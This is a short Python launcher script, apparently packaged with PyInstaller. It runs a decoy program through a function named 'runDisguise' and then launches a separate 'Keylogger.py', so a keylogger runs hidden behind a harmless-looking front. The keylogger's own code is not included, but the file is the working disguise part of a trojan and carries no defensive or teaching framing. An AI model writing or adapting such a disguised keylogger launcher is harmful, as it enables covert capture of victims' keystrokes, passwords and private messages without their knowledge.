import subprocess
import os
import sys

# Check if the the program is run as a bundled executable or just normal script
if getattr(sys, "frozen", False):
    # Getting the temp folder in which pyinstaller stores the bundled files
    path = sys._MEIPASS
else:
    # Getting the directory of this file
    path = os.path.dirname(__file__)

def runDisguise():
    programPath = os.path.join(path, "test.py")
    subprocess.run(["python", programPath])

def runLog():
    programPath = os.path.join(path, "Keylogger.py")
    subprocess.run(["python", programPath])

if __name__ == "__main__":
    runDisguise()
    runLog()